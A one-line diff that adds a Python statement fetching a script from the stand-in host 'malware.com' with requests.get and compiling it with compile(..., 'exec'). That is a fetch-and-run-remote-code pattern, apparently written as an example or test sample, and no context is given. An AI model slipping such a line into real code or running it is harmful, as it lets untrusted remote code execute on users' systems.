@@ -1,0 +1,1 @@
+compile(requests.get("http://malware.com/script.py").content, "<remote>", "exec")
